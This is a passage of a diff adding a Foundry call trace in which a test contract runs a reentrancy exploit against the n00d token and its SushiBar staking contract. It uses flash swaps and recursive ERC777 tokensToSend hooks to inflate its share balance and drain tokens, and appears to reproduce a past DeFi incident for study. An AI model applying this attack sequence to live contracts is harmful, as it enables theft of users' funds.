+    │   │   │   │   │   @ 0x02cb2bab5a8cadb81d126e67d0010d892c29c4fbfb048be8b822309b563c43ae: 0x0000000000000000000000000000000000000000000002d9d07e79ca14914262 → 0x0000000000000000000000000000000000000000000003e435a2dffef675d72d
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000001aecb0469ee699f4bf6 → 0x0000000000000000000000000000000000000000000003f543e53034973f1ac6
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x00000000000000000000000000000000000000000000024678e0c6462d9fced0
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [490] SushiBar::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 95460708695062071009718 [9.546e22]
+    │   │   ├─ [15468] SushiBar::leave(95460708695062071009718 [9.546e22])
+    │   │   │   ├─ [645] n00dToken::balanceOf(SushiBar: [0x3561081260186E69369E6C32F280836554292E08]) [staticcall]
+    │   │   │   │   └─ ← [Return] 18376821995131100321581 [1.837e22]
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 95460708695062071009718 [9.546e22])
+    │   │   │   ├─ [10089] n00dToken::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 16964586805942722692944 [1.696e22])
+    │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   ├─ emit Sent(operator: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], from: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 16964586805942722692944 [1.696e22], data: 0x, operatorData: 0x)
+    │   │   │   │   ├─ emit Transfer(from: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 16964586805942722692944 [1.696e22])
+    │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x02cb2bab5a8cadb81d126e67d0010d892c29c4fbfb048be8b822309b563c43ae: 0x0000000000000000000000000000000000000000000003e435a2dffef675d72d → 0x00000000000000000000000000000000000000000000004c8eb346395fd2cfdd
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000000214ca48cc69c3c9299a → 0x0000000000000000000000000000000000000000000005ac7138662f5a6c30ea
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000001436ef7591a5d9e0e1b6 → 0
+    │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000015e5ba79fb9443802dac → 0x0000000000000000000000000000000000000000000001aecb0469ee699f4bf6
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [12740] n00dToken::transfer(0x5476DB8B72337d44A6724277083b1a927c82a389, 20331726101678700876837 [2.033e22])
+    │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   │   ├─ [1771] ContractTest::tokensToSend(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x5476DB8B72337d44A6724277083b1a927c82a389, 20331726101678700876837 [2.033e22], 0x, 0x)
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit Sent(operator: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5476DB8B72337d44A6724277083b1a927c82a389, amount: 20331726101678700876837 [2.033e22], data: 0x, operatorData: 0x)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5476DB8B72337d44A6724277083b1a927c82a389, value: 20331726101678700876837 [2.033e22])
+    │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(0x5476DB8B72337d44A6724277083b1a927c82a389, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0cf11efc3216fd8d92c6a92805a2eac4af4db336f9ee2de125b726f80d875500: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0x00000000000000000000000000000000000000000000044e3d422613aff7d425
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000005ac7138662f5a6c30ea → 0x00000000000000000000000000000000000000000000015e41d6f6cf51d85cc5
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  storage changes:
+    │   │   │   @ 37: 2 → 0
+    │   │   │   @ 38: 0x0000000000000000000000000000000000000000000000f114017d5296c9e16e → 0x00000000000000000000000000000000000000000000010a65246634e1e494cb
+    │   │   └─ ← [Stop]
+    │   ├─ [645] n00dToken::balanceOf(0x5476DB8B72337d44A6724277083b1a927c82a389) [staticcall]
+    │   │   └─ ← [Return] 20332726101678700876837 [2.033e22]
+    │   ├─ [534] WETH9::balanceOf(0x5476DB8B72337d44A6724277083b1a927c82a389) [staticcall]
+    │   │   └─ ← [Return] 75400440702963015319 [7.54e19]
+    │   ├─ emit Sync(reserve0: 20332726101678700876837 [2.033e22], reserve1: 75400440702963015319 [7.54e19])
+    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 20331726101678700876837 [2.033e22], amount1In: 0, amount0Out: 20269730923373664773210 [2.026e22], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 8: 0x635812f700000000000416642d54a803de9700000000044ae0e707df7d49a45a → 0x635812f700000000000416642d54a803de9700000000044e3d422613aff7d425
+    │   └─ ← [Stop]
+    ├─ [517] 0x5476DB8B72337d44A6724277083b1a927c82a389::getReserves() [staticcall]
+    │   └─ ← [Return] 20332726101678700876837 [2.033e22], 75400440702963015319 [7.54e19], 1666716407 [1.666e9]
+    ├─ [160007] 0x5476DB8B72337d44A6724277083b1a927c82a389::swap(20331726101678700876837 [2.033e22], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
+    │   ├─ [10089] n00dToken::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20331726101678700876837 [2.033e22])
+    │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(0x5476DB8B72337d44A6724277083b1a927c82a389, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   ├─ emit Sent(operator: 0x5476DB8B72337d44A6724277083b1a927c82a389, from: 0x5476DB8B72337d44A6724277083b1a927c82a389, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 20331726101678700876837 [2.033e22], data: 0x, operatorData: 0x)
+    │   │   ├─ emit Transfer(from: 0x5476DB8B72337d44A6724277083b1a927c82a389, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 20331726101678700876837 [2.033e22])
+    │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x0cf11efc3216fd8d92c6a92805a2eac4af4db336f9ee2de125b726f80d875500: 0x00000000000000000000000000000000000000000000044e3d422613aff7d425 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000000015e41d6f6cf51d85cc5 → 0x0000000000000000000000000000000000000000000005ac7138662f5a6c30ea
+    │   │   └─ ← [Return] true
+    │   ├─ [135842] ContractTest::uniswapV2Call(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20331726101678700876837 [2.033e22], 0, 0x00)
+    │   │   ├─ [645] n00dToken::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 26792830778104817135850 [2.679e22]
+    │   │   ├─ [100103] SushiBar::enter(5358566155620963427170 [5.358e21])
+    │   │   │   ├─ [645] n00dToken::balanceOf(SushiBar: [0x3561081260186E69369E6C32F280836554292E08]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1412235189188377628637 [1.412e21]
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 30152960909472947087154 [3.015e22])
+    │   │   │   ├─ [72188] n00dToken::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 5358566155620963427170 [5.358e21])
+    │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   │   │   ├─ [60844] ContractTest::tokensToSend(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 5358566155620963427170 [5.358e21], 0x, 0x)
+    │   │   │   │   │   ├─ [37972] SushiBar::enter(5358566155620963427170 [5.358e21])
+    │   │   │   │   │   │   ├─ [645] n00dToken::balanceOf(SushiBar: [0x3561081260186E69369E6C32F280836554292E08]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1412235189188377628637 [1.412e21]
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 144564949123789408272247 [1.445e23])
+    │   │   │   │   │   │   ├─ [32757] n00dToken::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 5358566155620963427170 [5.358e21])
+    │   │   │   │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   │   │   │   │   │   ├─ [21413] ContractTest::tokensToSend(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 5358566155620963427170 [5.358e21], 0x, 0x)
+    │   │   │   │   │   │   │   │   ├─ [18441] SushiBar::enter(5358566155620963427170 [5.358e21])
+    │   │   │   │   │   │   │   │   │   ├─ [645] n00dToken::balanceOf(SushiBar: [0x3561081260186E69369E6C32F280836554292E08]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1412235189188377628637 [1.412e21]
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 693100242391058785881783 [6.931e23])
+    │   │   │   │   │   │   │   │   │   ├─ [13226] n00dToken::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 5358566155620963427170 [5.358e21])
+    │   │   │   │   │   │   │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   │   │   │   │   │   │   │   │   ├─ [1882] ContractTest::tokensToSend(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 5358566155620963427170 [5.358e21], 0x, 0x)
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Sent(operator: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], amount: 5358566155620963427170 [5.358e21], data: 0x, operatorData: 0x)
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], value: 5358566155620963427170 [5.358e21])
+    │   │   │   │   │   │   │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   @ 0x02cb2bab5a8cadb81d126e67d0010d892c29c4fbfb048be8b822309b563c43ae: 0x00000000000000000000000000000000000000000000004c8eb346395fd2cfdd → 0x00000000000000000000000000000000000000000000016f0bbe8ddc71e8733f
+    │   │   │   │   │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000005ac7138662f5a6c30ea → 0x000000000000000000000000000000000000000000000489f42d1e8c48568d88
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000024ff7a14e8175c4f26a9 → 0x00000000000000000000000000000000000000000000b7c4842cd44aa228f560
+    │   │   │   │   │   │   │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000026ae45195205c5ee729f → 0x00000000000000000000000000000000000000000000b9734f313e390bc84156
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 37: 1 → 2
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   ├─ emit Sent(operator: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], amount: 5358566155620963427170 [5.358e21], data: 0x, operatorData: 0x)
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], value: 5358566155620963427170 [5.358e21])
+    │   │   │   │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000000489f42d1e8c48568d88 → 0x0000000000000000000000000000000000000000000003677721d6e93640ea26
+    │   │   │   │   │   │   │   │   @ 0x02cb2bab5a8cadb81d126e67d0010d892c29c4fbfb048be8b822309b563c43ae: 0x00000000000000000000000000000000000000000000016f0bbe8ddc71e8733f → 0x00000000000000000000000000000000000000000000029188c9d57f83fe16a1
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 2: 0x000000000000000000000000000000000000000000000811636917dcf810f328 → 0x0000000000000000000000000000000000000000000026ae45195205c5ee729f
+    │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000006629864adee8e71a732 → 0x0000000000000000000000000000000000000000000024ff7a14e8175c4f26a9
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 37: 0 → 1
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit Sent(operator: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], amount: 5358566155620963427170 [5.358e21], data: 0x, operatorData: 0x)
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], value: 5358566155620963427170 [5.358e21])
+    │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x02cb2bab5a8cadb81d126e67d0010d892c29c4fbfb048be8b822309b563c43ae: 0x00000000000000000000000000000000000000000000029188c9d57f83fe16a1 → 0x0000000000000000000000000000000000000000000003b405d51d229613ba03
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000003677721d6e93640ea26 → 0x000000000000000000000000000000000000000000000244fa168f46242b46c4
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000001aecb0469ee699f4bf6 → 0x000000000000000000000000000000000000000000000811636917dcf810f328
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x0000000000000000000000000000000000000000000006629864adee8e71a732
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [490] SushiBar::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 867818152424321141241184 [8.678e23]
+    │   │   ├─ [15468] SushiBar::leave(867818152424321141241184 [8.678e23])
+    │   │   │   ├─ [645] n00dToken::balanceOf(SushiBar: [0x3561081260186E69369E6C32F280836554292E08]) [staticcall]
+    │   │   │   │   └─ ← [Return] 17487933656051267910147 [1.748e22]
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 867818152424321141241184 [8.678e23])
+    │   │   │   ├─ [10089] n00dToken::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 17329247380201604509608 [1.732e22])
+    │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   ├─ emit Sent(operator: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], from: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 17329247380201604509608 [1.732e22], data: 0x, operatorData: 0x)
+    │   │   │   │   ├─ emit Transfer(from: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 17329247380201604509608 [1.732e22])
+    │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x02cb2bab5a8cadb81d126e67d0010d892c29c4fbfb048be8b822309b563c43ae: 0x0000000000000000000000000000000000000000000003b405d51d229613ba03 → 0x0000000000000000000000000000000000000000000000089a36e7211cd5ca5b
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000000244fa168f46242b46c4 → 0x0000000000000000000000000000000000000000000005f065b4c5479d69366c
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000000b7c4842cd44aa228f560 → 0
+    │   │   │   │   @ 2: 0x00000000000000000000000000000000000000000000b9734f313e390bc84156 → 0x0000000000000000000000000000000000000000000001aecb0469ee699f4bf6
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [12740] n00dToken::transfer(0x5476DB8B72337d44A6724277083b1a927c82a389, 20393907825154163367937 [2.039e22])
+    │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   │   ├─ [1771] ContractTest::tokensToSend(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x5476DB8B72337d44A6724277083b1a927c82a389, 20393907825154163367937 [2.039e22], 0x, 0x)
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit Sent(operator: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5476DB8B72337d44A6724277083b1a927c82a389, amount: 20393907825154163367937 [2.039e22], data: 0x, operatorData: 0x)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5476DB8B72337d44A6724277083b1a927c82a389, value: 20393907825154163367937 [2.039e22])
+    │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(0x5476DB8B72337d44A6724277083b1a927c82a389, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0cf11efc3216fd8d92c6a92805a2eac4af4db336f9ee2de125b726f80d875500: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0x0000000000000000000000000000000000000000000004519c34021ffc7a6001
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000005f065b4c5479d69366c → 0x00000000000000000000000000000000000000000000019ed76179db4852d66b
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  storage changes:
+    │   │   │   @ 38: 0x00000000000000000000000000000000000000000000010a65246634e1e494cb → 0x0000000000000000000000000000000000000000000001227d0b47a31215a362
+    │   │   │   @ 37: 2 → 0
+    │   │   └─ ← [Stop]
+    │   ├─ [645] n00dToken::balanceOf(0x5476DB8B72337d44A6724277083b1a927c82a389) [staticcall]
+    │   │   └─ ← [Return] 20394907825154163367937 [2.039e22]
+    │   ├─ [534] WETH9::balanceOf(0x5476DB8B72337d44A6724277083b1a927c82a389) [staticcall]
+    │   │   └─ ← [Return] 75400440702963015319 [7.54e19]
+    │   ├─ emit Sync(reserve0: 20394907825154163367937 [2.039e22], reserve1: 75400440702963015319 [7.54e19])
+    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 20393907825154163367937 [2.039e22], amount1In: 0, amount0Out: 20331726101678700876837 [2.033e22], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 8: 0x635812f700000000000416642d54a803de9700000000044e3d422613aff7d425 → 0x635812f700000000000416642d54a803de970000000004519c34021ffc7a6001
+    │   └─ ← [Stop]
+    ├─ [517] 0x5476DB8B72337d44A6724277083b1a927c82a389::getReserves() [staticcall]
+    │   └─ ← [Return] 20394907825154163367937 [2.039e22], 75400440702963015319 [7.54e19], 1666716407 [1.666e9]
+    ├─ [160007] 0x5476DB8B72337d44A6724277083b1a927c82a389::swap(20393907825154163367937 [2.039e22], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
+    │   ├─ [10089] n00dToken::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20393907825154163367937 [2.039e22])
+    │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(0x5476DB8B72337d44A6724277083b1a927c82a389, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   ├─ emit Sent(operator: 0x5476DB8B72337d44A6724277083b1a927c82a389, from: 0x5476DB8B72337d44A6724277083b1a927c82a389, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 20393907825154163367937 [2.039e22], data: 0x, operatorData: 0x)
+    │   │   ├─ emit Transfer(from: 0x5476DB8B72337d44A6724277083b1a927c82a389, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 20393907825154163367937 [2.039e22])
+    │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x0cf11efc3216fd8d92c6a92805a2eac4af4db336f9ee2de125b726f80d875500: 0x0000000000000000000000000000000000000000000004519c34021ffc7a6001 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000000019ed76179db4852d66b → 0x0000000000000000000000000000000000000000000005f065b4c5479d69366c
+    │   │   └─ ← [Return] true
+    │   ├─ [135842] ContractTest::uniswapV2Call(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20393907825154163367937 [2.039e22], 0, 0x00)
+    │   │   ├─ [645] n00dToken::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 28046379691443531363948 [2.804e22]
